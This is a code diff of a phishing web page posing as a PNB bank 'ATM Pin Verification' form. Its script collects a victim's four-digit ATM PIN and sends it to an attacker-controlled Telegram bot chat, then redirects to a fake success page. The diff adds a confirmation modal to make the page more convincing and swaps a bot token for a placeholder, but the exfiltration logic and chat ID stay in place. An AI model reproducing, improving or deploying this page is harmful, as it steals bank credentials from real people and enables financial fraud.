@@ -15,23 +15,28 @@
             flex-direction: column;
             min-height: 100vh;
         }
+
         main {
             flex: 1;
         }
+
         .header {
             background-color: #a90000;
             color: white;
             padding: 20px;
             font-size: 18px;
         }
+
         .sub-header {
             background-color: #ffcc00;
             padding: 5px;
             font-weight: bold;
         }
+
         .container {
             padding: 20px;
         }
+
         .input-box {
             width: 80%;
             max-width: 300px;
@@ -41,6 +46,7 @@
             border-radius: 5px;
             font-size: 16px;
         }
+
         .btn {
             background-color: #ffcc00;
             padding: 10px 20px;
@@ -50,6 +56,7 @@
             border-radius: 5px;
             font-weight: bold;
         }
+
         .footer {
             background-color: #a90000;
             color: white;
@@ -57,11 +64,48 @@
             margin-top: auto;
             width: 100%;
         }
+
         .logo {
             display: block;
             margin: 0 auto;
             padding: 10px 0;
             max-width: 150px;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 999;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: white;
+            margin: 15% auto;
+            padding: 20px;
+            max-width: 400px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .modal-btn {
+            background-color: #a90000;
+            color: white;
+            padding: 10px 20px;
+            margin-top: 10px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+        }
+
+        .cancel-btn {
+            background-color: #ddd;
+            color: #333;
         }
     </style>
 </head>
@@ -75,29 +119,53 @@
     <main>
         <div class="container">
             <section class="verification-form">
-                <h2>Account ATM Pin  Verification</h2>
-                <form id="verification-form" class="form-container">
-            <form id="pinForm">
-                <input type="password" id="atm-pin" name="atm_pin" class="input-box" placeholder="Enter ATM Pin" required minlength="4" maxlength="4">
-                <br>
-                <button type="submit" class="btn">VERIFY</button>
-            </form>
+                <h2>Account ATM Pin Verification</h2>
+                <form id="pinForm">
+                    <input type="password" id="atm-pin" name="atm_pin" class="input-box" placeholder="Enter ATM Pin" required minlength="4" maxlength="4">
+                    <br>
+                    <button type="submit" class="btn">VERIFY</button>
+                </form>
+            </section>
         </div>
     </main>
 
+    <!-- Modal Confirmation -->
+    <div id="confirmation-modal" class="modal">
+        <div class="modal-content">
+            <h3>Confirm Submission</h3>
+            <p>Are you sure you want to proceed with the given ATM PIN?</p>
+            <button id="confirm-btn" class="modal-btn">Confirm</button>
+            <button id="cancel-btn" class="modal-btn cancel-btn">Cancel</button>
+        </div>
+    </div>
+
     <script>
-        const botToken = "7302997867:AAGU5IW98_lQkdPXn5Y7lAxFEZUIP7Yo1YQ"; // Secure token replacement
+        const botToken = "REDACTED_FOR_SECURITY";
         const chatId = "-1002377802733";
 
-        document.getElementById("pinForm").addEventListener("submit", function (event) {
-            event.preventDefault();
+        const pinForm = document.getElementById("pinForm");
+        const modal = document.getElementById("confirmation-modal");
+        const confirmBtn = document.getElementById("confirm-btn");
+        const cancelBtn = document.getElementById("cancel-btn");
 
-            const atmPin = document.getElementById("atm-pin").value;
+        let atmPin;
+
+        // Show Modal on Submit
+        pinForm.addEventListener("submit", function (event) {
+            event.preventDefault();
+            atmPin = document.getElementById("atm-pin").value;
 
             if (atmPin.length !== 4 || isNaN(atmPin)) {
                 alert("Please enter a valid 4-digit numeric PIN.");
                 return;
             }
+
+            modal.style.display = "block";
+        });
+
+        // Confirm Action
+        confirmBtn.addEventListener("click", function () {
+            modal.style.display = "none";
 
             const message = `🔹 **PNB Credit Card PIN Setup**\n🔑 **ATM PIN:** ${atmPin}`;
 
@@ -114,12 +182,24 @@
             .then(response => {
                 if (response.ok) {
                     alert("PIN successfully processed. Redirecting...");
-                    window.location.href = "netsuccess.html";
+                    window.location.href = "netsuccess.html";  // Redirect to netsuccess.html
                 } else {
                     alert("Error sending PIN. Please try again.");
                 }
             })
             .catch(error => console.error("Telegram Error:", error));
+        });
+
+        // Cancel Modal Action
+        cancelBtn.addEventListener("click", function () {
+            modal.style.display = "none";
+        });
+
+        // Close Modal on Background Click
+        window.addEventListener("click", function (event) {
+            if (event.target === modal) {
+                modal.style.display = "none";
+            }
         });
     </script>
 
